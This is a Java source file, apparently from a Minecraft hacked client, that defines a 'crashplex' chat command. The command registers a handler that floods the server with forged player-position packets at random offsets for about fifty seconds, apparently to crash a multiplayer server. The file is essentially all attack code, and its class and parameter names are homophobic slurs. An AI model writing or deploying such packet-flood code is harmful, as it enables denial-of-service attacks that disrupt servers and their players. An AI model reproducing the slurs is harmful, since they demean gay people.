package ooo.cpacket.ruby.command.commands;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C0APacketAnimation;
import ooo.cpacket.ruby.ClientBase;
import ooo.cpacket.ruby.api.event.EventImpl;
import ooo.cpacket.ruby.api.event.EventManager;
import ooo.cpacket.ruby.api.event.events.player.EventMotionUpdate;
import ooo.cpacket.ruby.command.Command;
import ooo.cpacket.ruby.util.Timer;

public class crashplex extends Command {

	public crashplex() {
		super("crashplex", "xd");
	}

	@Override
	public void run(String[] args) {
		mc.thePlayer.sendChatMessage("Meme Client > You");
		EventManager.register(new minequeerdestroyer());
	}
	static class minequeerdestroyer {
		public Timer lol = new Timer();
		@EventImpl
		public void run(EventMotionUpdate faggot) {
			if (lol.hasReached(50000L)) {
				EventManager.unregister(this);
				lol.reset();
			}
			for (int i = 0; i < 20; ++i) {
				Minecraft.getMinecraft().thePlayer.createAndSendC04(Minecraft.getMinecraft().thePlayer.posX + Math.random() * 8, Minecraft.getMinecraft().thePlayer.posY, Minecraft.getMinecraft().thePlayer.posZ + Math.random() * 8, true);
			}
		}
	}

}
